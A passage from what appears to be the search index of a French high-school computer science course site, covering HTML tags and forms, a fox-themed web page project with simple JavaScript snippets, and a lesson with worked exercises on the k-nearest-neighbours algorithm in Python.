src=\"image.jpg\" alt=\"description\"&gt;</code> : Image</li> <li><code>&lt;video&gt;</code>, <code>&lt;audio&gt;</code> : \u00c9l\u00e9ments multim\u00e9dias</li> </ul> \ud83d\udccb Balises de liste <ul> <li><code>&lt;ul&gt;</code> : Liste non ordonn\u00e9e (\u00e0 puces)</li> <li><code>&lt;ol&gt;</code> : Liste ordonn\u00e9e (num\u00e9rot\u00e9e)</li> <li><code>&lt;li&gt;</code> : \u00c9l\u00e9ment de liste</li> </ul> \ud83d\udcca Balises de tableau <ul> <li><code>&lt;table&gt;</code> : D\u00e9finit un tableau</li> <li><code>&lt;tr&gt;</code> : Ligne de tableau</li> <li><code>&lt;th&gt;</code> : Cellule d'en-t\u00eate</li> <li><code>&lt;td&gt;</code> : Cellule de donn\u00e9es</li> </ul> \ud83d\udcdd Balises de formulaire <ul> <li><code>&lt;form&gt;</code> : D\u00e9finit un formulaire</li> <li><code>&lt;input&gt;</code> : Champ de saisie</li> <li><code>&lt;textarea&gt;</code> : Zone de texte multiligne</li> <li><code>&lt;button&gt;</code> : Bouton</li> <li><code>&lt;select&gt;</code> et <code>&lt;option&gt;</code> : Liste d\u00e9roulante</li> </ul> \ud83d\udcdd Formulaires et transmission de donn\u00e9es \ud83d\udccb Les formulaires HTML              Les formulaires HTML permettent aux utilisateurs d'envoyer des donn\u00e9es au serveur. Ils sont d\u00e9finis par la balise <code>&lt;form&gt;</code> et contiennent divers \u00e9l\u00e9ments interactifs comme des champs de texte, des cases \u00e0 cocher, des boutons radio, etc.          \ud83c\udfd7\ufe0f Structure d'un formulaire \ud83d\udcbb Exemple de formulaire <pre>\n&lt;form action=\"/traitement.php\" method=\"post\"&gt;\n    &lt;label for=\"nom\"&gt;Nom :&lt;/label&gt;\n    &lt;input type=\"text\" id=\"nom\" name=\"nom\" required&gt;\n\n    &lt;label for=\"email\"&gt;Email :&lt;/label&gt;\n    &lt;input type=\"email\" id=\"email\" name=\"email\" required&gt;\n\n    &lt;label for=\"message\"&gt;Message :&lt;/label&gt;\n    &lt;textarea id=\"message\" name=\"message\"&gt;&lt;/textarea&gt;\n\n    &lt;button type=\"submit\"&gt;Envoyer&lt;/button&gt;\n&lt;/form&gt;\n                </pre> \ud83d\udccc Attributs importants de la balise &lt;form&gt; :             \u2022 action : URL o\u00f9 les donn\u00e9es du formulaire seront envoy\u00e9es             \u2022 method : M\u00e9thode HTTP utilis\u00e9e pour envoyer les donn\u00e9es (GET ou POST)"},{"location":"premiere/X-Web_et_HTTP/TP/Projet/","title":"Projet","text":"\ud83c\udfa8 Cr\u00e9ation de pages WEB dynamiques <p>Tableaux de ma\u00eetres revisit\u00e9s avec des renards</p> \ud83c\udfaf Objectif du projet              Le but de ce projet est de cr\u00e9er une page web pr\u00e9sentant un tableau de ma\u00eetre revisit\u00e9 avec des renards. Chaque \u00e9l\u00e8ve travaillera sur un tableau diff\u00e9rent, qu'il choisira ou tirera au sort parmi une s\u00e9lection de 18 tableaux.          \ud83d\udcc1 Ressources fournies              Vous retrouverez un dossier contenant :             <ul> <li>Un exemple de CSS</li> <li>Une fonction JavaScript g\u00e9rant le changement d'images</li> <li>Le formulaire de base</li> </ul>              Voici la maquette : \ud83d\udce6 maquette \ud83c\udfa8 La page Web et son style \ud83d\udccb Contenu requis              Vous devrez cr\u00e9er une page web pr\u00e9sentant le tableau revisit\u00e9 qui vous a \u00e9t\u00e9 attribu\u00e9. Votre page devra inclure :             <ul> <li>Une pr\u00e9sentation du tableau original (titre, auteur, date, contexte historique)</li> <li>Une pr\u00e9sentation du tableau revisit\u00e9 avec des renards</li> <li>Une histoire invent\u00e9e autour de ce tableau et de ses personnages renards</li> <li>Des \u00e9l\u00e9ments visuels et textuels mettant en valeur votre cr\u00e9ativit\u00e9</li> </ul> \ud83d\udcc1 Structure des dossiers              Vous r\u00e9aliserez une arborescence correcte avec :             <ul> <li>Les images dans le dossier images</li> <li>Les feuilles de style dans un dossier styles</li> <li>Les scripts JavaScript dans un dossier scripts</li> <li>La page web nomm\u00e9e index.html \u00e0 la racine de l'arborescence</li> </ul> \ud83d\udcc2 Organisation des fichiers <pre>\nprojet-tableau-renard/\n\u251c\u2500\u2500 index.html\n\u251c\u2500\u2500 images/\n\u2502   \u251c\u2500\u2500 tableau-original.jpg\n\u2502   \u2514\u2500\u2500 tableau-renard.jpg\n\u251c\u2500\u2500 styles/\n\u2502   \u2514\u2500\u2500 style.css\n\u2514\u2500\u2500 scripts/\n    \u2514\u2500\u2500 script.js\n        </pre> \ud83d\udca1 Exemple : Voici un exemple de structure de fichiers pour votre projet : \u26a1 2 - Dynamiser la page avec JavaScript \ud83c\udfaf Objectif              Pour rendre votre page plus interactive, vous allez ajouter une seule fonctionnalit\u00e9 JavaScript simple. Le code complet vous est fourni, vous devrez simplement le copier et l'adapter \u00e0 votre projet.          \ud83d\udccb \u00c9tapes \u00e0 suivre 1 Choisissez UNE fonctionnalit\u00e9 parmi celles propos\u00e9es 2 Copiez le code HTML dans index.html 3 Copiez le JavaScript dans scripts/script.js 4 Copiez le CSS dans styles/style.css 5 Testez votre page dans le navigateur \ud83d\uddbc\ufe0f Option 1 : Bouton pour changer d'image (FACILE) Ce que \u00e7a fait : Un bouton qui permet de passer du tableau original au tableau avec des renards.          \ud83d\udcdd Code HTML \u00e0 ajouter dans votre page <pre>&lt;button id=\"bouton-image\"&gt;Voir la version renard&lt;/button&gt;\n&lt;img id=\"image-tableau\" src=\"images/tableau-original.jpg\" alt=\"Tableau\"&gt;</pre> \u26a1 Code JavaScript \u00e0 mettre dans scripts/script.js <pre>// Variables pour stocker les \u00e9l\u00e9ments\nconst bouton = document.getElementById('bouton-image');\nconst image = document.getElementById('image-tableau');\n\n// Variable pour savoir quelle image est affich\u00e9e\nlet imageOriginale = true;\n\n// Fonction qui s'ex\u00e9cute quand on clique sur le bouton\nbouton.addEventListener('click', function() {\n    if (imageOriginale) {\n        // Changer vers l'image renard\n        image.src = 'images/tableau-renard.jpg';\n        bouton.textContent = 'Voir l\\'original';\n        imageOriginale = false;\n    } else {\n        // Revenir \u00e0 l'image originale\n        image.src = 'images/tableau-original.jpg';\n        bouton.textContent = 'Voir la version renard';\n        imageOriginale = true;\n    }\n});</pre> \ud83c\udfa8 Code CSS \u00e0 ajouter dans styles/style.css <pre>#bouton-image {\n    background-color: #ff6b35;\n    color: white;\n    border: none;\n    padding: 10px 20px;\n    font-size: 16px;\n    border-radius: 5px;\n    cursor: pointer;\n    margin: 20px 0;\n}\n\n#bouton-image:hover {\n    background-color: #e55a2b;\n}\n\n#image-tableau {\n    max-width: 100%;\n    height: auto;\n    border-radius: 10px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.3);\n}</pre> \ud83c\udf19 Option 2 : Mode Jour/Nuit (MOYEN) Ce que \u00e7a fait : Un bouton qui change les couleurs de toute la page (fond sombre/clair).          \ud83d\udcdd Code HTML \u00e0 ajouter <pre>&lt;button id=\"bouton-mode\"&gt;\ud83c\udf19 Mode nuit&lt;/button&gt;</pre> \u26a1 Code JavaScript \u00e0 mettre dans scripts/script.js <pre>// R\u00e9cup\u00e9rer le bouton et le body de la page\nconst boutonMode = document.getElementById('bouton-mode');\nconst body = document.body;\n\n// Fonction qui s'ex\u00e9cute quand on clique sur le bouton\nboutonMode.addEventListener('click', function() {\n    // Ajouter ou enlever la classe 'mode-nuit'\n    body.classList.toggle('mode-nuit');\n\n    // Changer le texte du bouton selon le mode\n    if (body.classList.contains('mode-nuit')) {\n        boutonMode.textContent = '\u2600\ufe0f Mode jour';\n    } else {\n        boutonMode.textContent = '\ud83c\udf19 Mode nuit';\n    }\n});</pre> \ud83c\udfa8 Code CSS \u00e0 ajouter dans styles/style.css <pre>/* Style du bouton */\n#bouton-mode {\n    background-color: #4a90e2;\n    color: white;\n    border: none;\n    padding: 10px 15px;\n    border-radius: 20px;\n    cursor: pointer;\n    font-size: 14px;\n    position: fixed;\n    top: 20px;\n    right: 20px;\n}\n\n/* Styles pour le mode nuit */\n.mode-nuit {\n    background-color: #1a1a1a;\n    color: #ffffff;\n}\n\n.mode-nuit h1, .mode-nuit h2, .mode-nuit h3 {\n    color: #ffffff;\n}\n\n.mode-nuit p {\n    color: #cccccc;\n}</pre> \ud83d\udc46 Option 3 : Affichage de texte au clic (TR\u00c8S FACILE) Ce que \u00e7a fait : Cliquer sur l'image affiche un texte cach\u00e9 avec des informations sur le tableau.          \ud83d\udcdd Code HTML \u00e0 ajouter <pre>&lt;img id=\"image-cliquable\" src=\"images/tableau-renard.jpg\" alt=\"Tableau\" style=\"cursor: pointer;\"&gt;\n&lt;p id=\"texte-cache\" style=\"display: none;\"&gt;\ud83e\udd8a Les renards ont envahi ce tableau ! D\u00e9couvrez leur histoire...&lt;/p&gt;</pre> \u26a1 Code JavaScript \u00e0 mettre dans scripts/script.js <pre>// R\u00e9cup\u00e9rer l'image et le texte\nconst imageCliquable = document.getElementById('image-cliquable');\nconst texteCache = document.getElementById('texte-cache');\n\n// Fonction qui s'ex\u00e9cute quand on clique sur l'image\nimageCliquable.addEventListener('click', function() {\n    // V\u00e9rifier si le texte est cach\u00e9 ou visible\n    if (texteCache.style.display === 'none') {\n        texteCache.style.display = 'block'; // Montrer le texte\n    } else {\n        texteCache.style.display = 'none';  // Cacher le texte\n    }\n});</pre> \ud83c\udfa8 Code CSS \u00e0 ajouter dans styles/style.css <pre>#image-cliquable {\n    max-width: 100%;\n    height: auto;\n    border-radius: 10px;\n    transition: transform 0.2s;\n}\n\n#image-cliquable:hover {\n    transform: scale(1.02);\n}\n\n#texte-cache {\n    background-color: #fff3cd;\n    border: 2px solid #ffeaa7;\n    padding: 15px;\n    border-radius: 8px;\n    margin-top: 15px;\n    font-style: italic;\n    text-align: center;\n}</pre> \ud83d\udcda Ressources utiles \ud83d\udd17 Liens utiles <ul> <li>MDN Web Docs - JavaScript</li> <li>W3Schools - JavaScript Tutorial</li> <li>CSS Tricks</li> <li>Google Fonts</li> </ul> \ud83c\udf89 Bon travail et amusez-vous bien avec ce projet cr\u00e9atif ! \ud83e\udd8a\ud83c\udfa8"},{"location":"premiere/X-Web_et_HTTP/TP/galerie_d_art/","title":"Ensemble des tableaux","text":""},{"location":"premiere/XI-K_plus_proches_voisins/Cours/","title":"Cours","text":"\ud83d\udcda Algorithme des K Plus Proches Voisins <p>Comprendre l'algorithme KNN et ses applications</p> \ud83d\udcd6 D\u00e9finition \ud83e\udd16 Qu'est-ce que l'algorithme KNN ?              L'algorithme des K Plus Proches Voisins (K-Nearest Neighbors ou KNN) est une m\u00e9thode d'apprentissage supervis\u00e9 simple et intuitive, utilis\u00e9e principalement pour des probl\u00e8mes de classification et de r\u00e9gression.          \ud83d\udd0d Concepts cl\u00e9s <ul> <li>Apprentissage supervis\u00e9 : L'algorithme apprend \u00e0 partir d'un ensemble de donn\u00e9es o\u00f9 les \"bonnes r\u00e9ponses\" (\u00e9tiquettes ou valeurs) sont d\u00e9j\u00e0 connues.</li> <li>Classification : Pr\u00e9dire \u00e0 quelle cat\u00e9gorie appartient un nouvel \u00e9l\u00e9ment (par exemple, si un email est un spam ou non).</li> <li>R\u00e9gression : Pr\u00e9dire une valeur continue pour un nouvel \u00e9l\u00e9ment (par exemple, estimer le prix d'une maison).</li> </ul> \ud83d\udca1 Principe fondamental : L'id\u00e9e centrale de KNN est que des choses similaires existent \u00e0 proximit\u00e9 les unes des autres. Un nouvel \u00e9l\u00e9ment sera probablement similaire \u00e0 ses voisins les plus proches dans l'ensemble de donn\u00e9es d'entra\u00eenement.          \u2699\ufe0f Comment fonctionne KNN ? 1 Choisir le nombre K                  On d\u00e9finit K, le nombre de voisins les plus proches \u00e0 consid\u00e9rer. C'est un param\u00e8tre important \u00e0 r\u00e9gler.              2 Calculer les distances                  Pour un nouvel \u00e9l\u00e9ment, on calcule la distance entre cet \u00e9l\u00e9ment et tous les autres \u00e9l\u00e9ments de l'ensemble de donn\u00e9es d'entra\u00eenement. La mesure de distance la plus courante est la distance euclidienne.              3 Identifier les K voisins                  On s\u00e9lectionne les K \u00e9l\u00e9ments de l'ensemble d'entra\u00eenement qui sont les plus proches du nouvel \u00e9l\u00e9ment (ceux ayant les plus petites distances).              4 Prendre une d\u00e9cision Classification : On regarde la cat\u00e9gorie majoritaire parmi les K voisins. R\u00e9gression : On calcule la moyenne des valeurs des K voisins.              \ud83d\udcdd Exemple simple de classification              Imaginons que nous ayons des points de donn\u00e9es de deux cat\u00e9gories (A et B) et un nouveau point inconnu (X). Si nous choisissons K=3 :             <ol> <li>On calcule la distance entre X et tous les autres points.</li> <li>On trouve les 3 points les plus proches de X.</li> <li>Si 2 de ces 3 voisins sont de la cat\u00e9gorie A et 1 est de la cat\u00e9gorie B, alors X sera classifi\u00e9 comme A.</li> </ol> \ud83d\udccf La mesure de distance \ud83d\udcd0 Distance euclidienne              La distance euclidienne est la plus utilis\u00e9e. Pour deux points P(p1, p2, ..., pn) et Q(q1, q2, ..., qn) dans un espace \u00e0 n dimensions, la distance euclidienne est :          \ud83d\udcca Formule de la distance euclidienne <pre>\nd(P, Q) = \u221a((p1-q1)\u00b2 + (p2-q2)\u00b2 + ... + (pn-qn)\u00b2)\n        </pre> \ud83d\udccf Autres mesures de distance              D'autres mesures de distance existent, comme la distance de Manhattan ou la distance de Minkowski.          \u26a0\ufe0f Important - Normalisation des donn\u00e9es : Si les diff\u00e9rentes caract\u00e9ristiques (dimensions) de vos donn\u00e9es n'ont pas la m\u00eame \u00e9chelle (par exemple, une caract\u00e9ristique varie de 0 \u00e0 1 et une autre de 0 \u00e0 1000), celles avec des valeurs plus grandes domineront le calcul de la distance. Il est donc crucial de normaliser ou standardiser vos donn\u00e9es avant d'appliquer KNN.          \ud83c\udfaf Choisir la valeur de K \u2696\ufe0f L'importance du choix de K              Le choix de K est crucial pour la performance de l'algorithme. Il faut trouver un \u00e9quilibre entre sensibilit\u00e9 et robustesse.          \ud83d\udcc9 K petit (ex: K=1)                  L'algorithme est tr\u00e8s sensible au bruit et aux points aberrants. Le mod\u00e8le peut \u00eatre trop sp\u00e9cifique aux donn\u00e9es d'entra\u00eenement (surapprentissage ou overfitting).              \ud83d\udcc8 K grand                  L'algorithme est plus robuste au bruit, mais peut rendre les fronti\u00e8res de d\u00e9cision moins distinctes. Si K est trop grand, tous les nouveaux points seront classifi\u00e9s dans la cat\u00e9gorie majoritaire.              \ud83d\udca1 Conseils pour choisir K <ul> <li>Il n'y a pas de r\u00e8gle d'or pour choisir K</li> <li>On utilise souvent des techniques comme la validation crois\u00e9e pour trouver une valeur optimale</li> <li>Une pratique courante est de choisir K comme un nombre impair pour \u00e9viter les \u00e9galit\u00e9s en classification binaire</li> </ul> \u2696\ufe0f Avantages et Inconv\u00e9nients \u2705 Avantages de KNN <ul> <li>Simple \u00e0 comprendre et \u00e0 impl\u00e9menter</li> <li>Non param\u00e9trique : Il ne fait aucune supposition sur la distribution sous-jacente des donn\u00e9es</li> <li>Polyvalent : Peut \u00eatre utilis\u00e9 pour la classification et la r\u00e9gression</li> <li>S'adapte facilement : De nouvelles donn\u00e9es peuvent \u00eatre ajout\u00e9es sans avoir \u00e0 r\u00e9-entra\u00eener le mod\u00e8le (apprentissage \"paresseux\" ou \"lazy learning\")</li> </ul> \u274c Inconv\u00e9nients de KNN <ul> <li>Co\u00fbteux en calcul : Pour chaque nouvelle pr\u00e9diction, il faut calculer la distance \u00e0 tous les points de l'ensemble d'entra\u00eenement</li> <li>Sensible aux dimensions non pertinentes (\"fl\u00e9au de la dimensionnalit\u00e9\")</li> <li>N\u00e9cessite une normalisation des donn\u00e9es : Les \u00e9chelles des caract\u00e9ristiques influencent fortement les distances</li> <li>N\u00e9cessite beaucoup de m\u00e9moire : Il faut stocker tout l'ensemble de donn\u00e9es d'entra\u00eenement</li> <li>Le choix de K est critique</li> </ul> \ud83c\udfaf Quand utiliser KNN ? \ud83d\udccb Cas d'usage recommand\u00e9s              KNN peut \u00eatre un bon point de d\u00e9part pour des probl\u00e8mes de classification ou de r\u00e9gression, surtout si :             <ul> <li>L'ensemble de donn\u00e9es n'est pas excessivement grand</li> <li>Les relations entre les caract\u00e9ristiques et la cible sont complexes et non lin\u00e9aires</li> <li>Vous avez besoin d'une m\u00e9thode simple et interpr\u00e9table</li> </ul> \ud83d\udca1 Utilisation pratique : KNN est souvent utilis\u00e9 comme baseline pour comparer avec des mod\u00e8les plus complexes.          <p> </p>"},{"location":"premiere/XI-K_plus_proches_voisins/Fiche_exercices_knn/","title":"Fiche d'exercices : K plus proches voisins (k-NN)","text":""},{"location":"premiere/XI-K_plus_proches_voisins/Fiche_exercices_knn/#partie-1-concepts-fondamentaux-du-k-nn","title":"\ud83d\udcda Partie 1 : Concepts fondamentaux du k-NN","text":"Introduction \ud83e\udd8a Exercice 1 - Principe de base Expliquez le principe de l'algorithme k-NN :             1. Que signifie \"k-NN\" ?             2. Comment fonctionne la classification avec k-NN ?             3. Quelle est la diff\u00e9rence entre k=1 et k=5 ?             4. Pourquoi utilise-t-on g\u00e9n\u00e9ralement un k impair ?             5. Quels sont les avantages et inconv\u00e9nients de k-NN ?          \u2192 Voir la correction          Explications :                 1. k-NN : k-Nearest Neighbors (k plus proches voisins)                 2. Fonctionnement :                    \u2022 Calculer la distance entre le point \u00e0 classifier et tous les points d'entra\u00eenement                    \u2022 S\u00e9lectionner les k points les plus proches                    \u2022 Attribuer la classe majoritaire parmi ces k voisins                 3. Diff\u00e9rence k=1 vs k=5 :                    \u2022 k=1 : Classification bas\u00e9e sur le voisin le plus proche uniquement                    \u2022 k=5 : Classification bas\u00e9e sur le vote des 5 voisins les plus proches                 4. k impair : \u00c9vite les \u00e9galit\u00e9s lors du vote (pas d'ex-aequo)                 5. Avantages : Simple, pas d'hypoth\u00e8se sur les donn\u00e9es, efficace pour donn\u00e9es non-lin\u00e9aires Inconv\u00e9nients : Co\u00fbteux en calcul, sensible aux donn\u00e9es aberrantes, n\u00e9cessite beaucoup de m\u00e9moire              Introduction \ud83e\udd8a Exercice 2 - Calcul de distance Calculez la distance euclidienne entre ces points :             Point A : (2, 3)             Point B : (5, 7)             Point C : (1, 1) Questions :             1. Distance entre A et B             2. Distance entre A et C             3. Distance entre B et C             4. Quel point est le plus proche de A ?          \u2192 Voir la correction          Calculs (formule : \u221a[(x\u2082-x\u2081)\u00b2 + (y\u2082-y\u2081)\u00b2]) :                 1. Distance A-B :                    \u221a[(5-2)\u00b2 + (7-3)\u00b2] = \u221a[3\u00b2 + 4\u00b2] = \u221a[9 + 16] = \u221a25 = 5                 2. Distance A-C :                    \u221a[(1-2)\u00b2 + (1-3)\u00b2] = \u221a[(-1)\u00b2 + (-2)\u00b2] = \u221a[1 + 4] = \u221a5 \u2248 2.24                 3. Distance B-C :                    \u221a[(1-5)\u00b2 + (1-7)\u00b2] = \u221a[(-4)\u00b2 + (-6)\u00b2] = \u221a[16 + 36] = \u221a52 \u2248 7.21                 4. Plus proche de A : Point C (distance \u2248 2.24)              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 3 - Classification simple Donn\u00e9es d'entra\u00eenement (Taille, Poids, Classe) : PointTaille (cm)Poids (kg)Classe 116050A 217065B 315545A 418080B 516555A Nouveau point \u00e0 classifier : (162, 52)             Utilisez k=3 pour classifier ce point.          \u2192 Voir la correction          Calcul des distances :                 Point \u00e0 classifier : (162, 52) PointDistanceClasse 1\u221a[(162-160)\u00b2 + (52-50)\u00b2] = \u221a8 \u2248 2.83A 2\u221a[(162-170)\u00b2 + (52-65)\u00b2] = \u221a233 \u2248 15.26B 3\u221a[(162-155)\u00b2 + (52-45)\u00b2] = \u221a98 \u2248 9.90A 4\u221a[(162-180)\u00b2 + (52-80)\u00b2] = \u221a1108 \u2248 33.29B 5\u221a[(162-165)\u00b2 + (52-55)\u00b2] = \u221a18 \u2248 4.24A 3 plus proches voisins : Points 1, 5, 3 Classes : A, A, A Classification : Classe A (vote unanime)"},{"location":"premiere/XI-K_plus_proches_voisins/Fiche_exercices_knn/#partie-2-implementation-en-python","title":"\ud83d\udcda Partie 2 : Impl\u00e9mentation en Python","text":"Moyen \ud83e\udd8a\ud83e\udd8a Exercice 4 - Fonction de distance Impl\u00e9mentez une fonction qui calcule la distance euclidienne : <pre>\ndef distance_euclidienne(point1, point2):\n    \"\"\"\n    Calcule la distance euclidienne entre deux points\n    point1 et point2 sont des listes [x, y]\n    \"\"\"\n    # \u00c0 compl\u00e9ter\n    pass\n            </pre> Testez avec :             \u2022 distance_euclidienne([0, 0], [3, 4]) \u2192 doit retourner 5.0             \u2022 distance_euclidienne([1, 1], [4, 5]) \u2192 doit retourner 5.0          \u2192 Voir la correction          Impl\u00e9mentation : <pre>\nimport math\n\ndef distance_euclidienne(point1, point2):\n    \"\"\"\n    Calcule la distance euclidienne entre deux points\n    point1 et point2 sont des listes [x, y]\n    \"\"\"\n    x1, y1 = point1\n    x2, y2 = point2\n    return math.sqrt((x2 - x1)**2 + (y2 - y1)**2)\n\n# Tests\nprint(distance_euclidienne([0, 0], [3, 4]))  # 5.0\nprint(distance_euclidienne([1, 1], [4, 5]))  # 5.0\n                </pre> Moyen \ud83e\udd8a\ud83e\udd8a Exercice 5 - Trouver les k plus proches voisins Impl\u00e9mentez une fonction qui trouve les k plus proches voisins : <pre>\ndef k_plus_proches_voisins(point_test, donnees_entrainement, k):\n    \"\"\"\n    Trouve les k plus proches voisins d'un point\n    point_test : [x, y]\n    donnees_entrainement : liste de [x, y, classe]\n    k : nombre de voisins \u00e0 retourner\n    \"\"\"\n    # \u00c0 compl\u00e9ter\n    pass\n            </pre> \u2192 Voir la correction          Impl\u00e9mentation : <pre>\ndef k_plus_proches_voisins(point_test, donnees_entrainement, k):\n    \"\"\"\n    Trouve les k plus proches voisins d'un point\n    point_test : [x, y]\n    donnees_entrainement : liste de [x, y, classe]\n    k : nombre de voisins \u00e0 retourner\n    \"\"\"\n    distances = []\n\n    # Calculer la distance pour chaque point d'entra\u00eenement\n    for donnee in donnees_entrainement:\n        point_entrainement = [donnee[0], donnee[1]]\n        classe = donnee[2]\n        dist = distance_euclidienne(point_test, point_entrainement)\n        distances.append((dist, classe, donnee))\n\n    # Trier par distance croissante\n    distances.sort(key=lambda x: x[0])\n\n    # Retourner les k premiers\n    return distances[:k]\n\n# Exemple d'utilisation\ndonnees = [[160, 50, 'A'], [170, 65, 'B'], [155, 45, 'A']]\nvoisins = k_plus_proches_voisins([162, 52], donnees, 2)\nprint(voisins)\n                </pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 6 - Algorithme k-NN complet Impl\u00e9mentez l'algorithme k-NN complet : <pre>\ndef classifier_knn(point_test, donnees_entrainement, k):\n    \"\"\"\n    Classifie un point avec l'algorithme k-NN\n    Retourne la classe pr\u00e9dite\n    \"\"\"\n    # \u00c0 compl\u00e9ter\n    pass\n\ndef evaluer_knn(donnees_test, donnees_entrainement, k):\n    \"\"\"\n    \u00c9value la pr\u00e9cision de l'algorithme k-NN\n    Retourne le pourcentage de bonnes classifications\n    \"\"\"\n    # \u00c0 compl\u00e9ter\n    pass\n            </pre> \u2192 Voir la correction          Impl\u00e9mentation compl\u00e8te : <pre>\ndef classifier_knn(point_test, donnees_entrainement, k):\n    \"\"\"\n    Classifie un point avec l'algorithme k-NN\n    Retourne la classe pr\u00e9dite\n    \"\"\"\n    # Trouver les k plus proches voisins\n    voisins = k_plus_proches_voisins(point_test, donnees_entrainement, k)\n\n    # Compter les votes pour chaque classe\n    votes = {}\n    for distance, classe, donnee in voisins:\n        if classe in votes:\n            votes[classe] += 1\n        else:\n            votes[classe] = 1\n\n    # Retourner la classe avec le plus de votes\n    classe_predite = max(votes, key=votes.get)\n    return classe_predite\n\ndef evaluer_knn(donnees_test, donnees_entrainement, k):\n    \"\"\"\n    \u00c9value la pr\u00e9cision de l'algorithme k-NN\n    Retourne le pourcentage de bonnes classifications\n    \"\"\"\n    bonnes_predictions = 0\n    total_predictions = len(donnees_test)\n\n    for donnee_test in donnees_test:\n        point_test = [donnee_test[0], donnee_test[1]]\n        vraie_classe = donnee_test[2]\n\n        classe_predite = classifier_knn(point_test, donnees_entrainement, k)\n\n        if classe_predite == vraie_classe:\n            bonnes_predictions += 1\n\n    precision = (bonnes_predictions / total_predictions) * 100\n    return precision\n\n# Exemple d'utilisation\nentrainement = [[160, 50, 'A'], [170, 65, 'B'], [155, 45, 'A'], \n                [180, 80, 'B'], [165, 55, 'A']]\ntest = [[162, 52, 'A'], [175, 70, 'B']]\n\nprint(f\"Pr\u00e9cision avec k=3: {evaluer_knn(test, entrainement, 3):.1f}%\")\n                </pre>"},{"location":"premiere/XI-K_plus_proches_voisins/Fiche_exercices_knn/#partie-3-applications-pratiques","title":"\ud83d\udcda Partie 3 : Applications pratiques","text":"Moyen \ud83e\udd8a\ud83e\udd8a Exercice 7 - Choix de k optimal Analysez l'impact de diff\u00e9rentes valeurs de k :             Donn\u00e9es : 100 points d'entra\u00eenement, 2 classes \u00e9quilibr\u00e9es kPr\u00e9cision (%)Temps (ms) 18510 39212 59415 109125 208845 508295 Questions :             1. Quelle valeur de k choisiriez-vous ?             2. Pourquoi k=1 donne-t-il une pr\u00e9cision plus faible ?             3. Pourquoi k=50 donne-t-il une pr\u00e9cision plus faible ?          \u2192 Voir la correction          Analyse :                 1. Choix optimal : k=5 (meilleure pr\u00e9cision 94% avec temps raisonnable)                 2. Probl\u00e8me k=1 :                    \u2022 Tr\u00e8s sensible au bruit et aux donn\u00e9es aberrantes                    \u2022 Pas de lissage, d\u00e9cisions trop locales                    \u2022 Overfitting possible                 3. Probl\u00e8me k=50 :                    \u2022 k trop grand par rapport \u00e0 la taille des donn\u00e9es (50% des donn\u00e9es)                    \u2022 Perte de la structure locale des donn\u00e9es                    \u2022 Tendance vers la classe majoritaire globale                    \u2022 Underfitting R\u00e8gle g\u00e9n\u00e9rale : k \u2248 \u221an o\u00f9 n est le nombre de points d'entra\u00eenement              Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 8 - Syst\u00e8me de recommandation Cr\u00e9ez un syst\u00e8me de recommandation de films avec k-NN : Donn\u00e9es utilisateurs (notes sur 5) : UtilisateurActionCom\u00e9dieDrameSci-Fi Alice5241 Bob1524 Charlie4352 Diana2415 Nouvel utilisateur : Eve (Action: 4, Com\u00e9die: 1, Drame: 5, Sci-Fi: ?)             Pr\u00e9disez la note de Eve pour les films Sci-Fi avec k=2.          \u2192 Voir la correction          Solution : 1. Calcul des distances (sans Sci-Fi) :                 Eve : [4, 1, 5]                 \u2022 Alice [5, 2, 4] : \u221a[(4-5)\u00b2 + (1-2)\u00b2 + (5-4)\u00b2] = \u221a3 \u2248 1.73                 \u2022 Bob [1, 5, 2] : \u221a[(4-1)\u00b2 + (1-5)\u00b2 + (5-2)\u00b2] = \u221a34 \u2248 5.83                 \u2022 Charlie [4, 3, 5] : \u221a[(4-4)\u00b2 + (1-3)\u00b2 + (5-5)\u00b2] = \u221a4 = 2.00                 \u2022 Diana [2, 4, 1] : \u221a[(4-2)\u00b2 + (1-4)\u00b2 + (5-1)\u00b2] = \u221a29 \u2248 5.39 2. Les 2 plus proches voisins :                 \u2022 Alice (distance 1.73, Sci-Fi: 1)                 \u2022 Charlie (distance 2.00, Sci-Fi: 2) 3. Pr\u00e9diction :                 Moyenne pond\u00e9r\u00e9e par l'inverse de la distance :                 Poids Alice = 1/1.73 \u2248 0.58                 Poids Charlie = 1/2.00 = 0.50                 Note pr\u00e9dite = (1\u00d70.58 + 2\u00d70.50) / (0.58 + 0.50) \u2248 1.46 Pr\u00e9diction pour Eve en Sci-Fi : \u2248 1.5/5 Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 9 - Optimisations et variantes Analysez ces am\u00e9liorations de l'algorithme k-NN :             1. k-NN pond\u00e9r\u00e9 : Les voisins plus proches ont plus d'influence             2. Normalisation : Mettre toutes les features \u00e0 la m\u00eame \u00e9chelle             3. Distance de Manhattan : |x\u2081-x\u2082| + |y\u2081-y\u2082|             4. R\u00e9duction de dimensionnalit\u00e9 : PCA avant k-NN Questions :             \u2022 Quand utiliser chaque am\u00e9lioration ?             \u2022 Impl\u00e9mentez la distance de Manhattan             \u2022 Pourquoi normaliser les donn\u00e9es ?          \u2192 Voir la correction          Analyse des am\u00e9liorations : 1. k-NN pond\u00e9r\u00e9 :                 \u2022 Utilisation : Quand la proximit\u00e9 est tr\u00e8s importante                 \u2022 Poids = 1/distance ou exp(-distance) 2. Normalisation :                 \u2022 N\u00e9cessaire quand les features ont des \u00e9chelles diff\u00e9rentes                 \u2022 Exemple : \u00e2ge (0-100) vs salaire (20000-100000) <pre>\ndef normaliser(donnees):\n    # Min-Max normalization\n    for i in range(len(donnees[0])-1):  # -1 pour exclure la classe\n        valeurs = [point[i] for point in donnees]\n        min_val, max_val = min(valeurs), max(valeurs)\n        for point in donnees:\n            point[i] = (point[i] - min_val) / (max_val - min_val)\n    return donnees\n                </pre> 3. Distance de Manhattan : <pre>\ndef distance_manhattan(point1, point2):\n    return sum(abs(a - b) for a, b in zip(point1, point2))\n                </pre>                 \u2022 Utilisation : Donn\u00e9es avec features ind\u00e9pendantes, moins sensible aux outliers 4. R\u00e9duction de dimensionnalit\u00e9 :                 \u2022 Utilisation : Donn\u00e9es haute dimension, r\u00e9duction du bruit                 \u2022 Am\u00e9liore les performances et r\u00e9duit la mal\u00e9diction de la dimensionnalit\u00e9"},{"location":"premiere/XI-K_plus_proches_voisins/TP_KNN/","title":"Travaux Pratiques : Algorithme des K Plus Proches Voisins 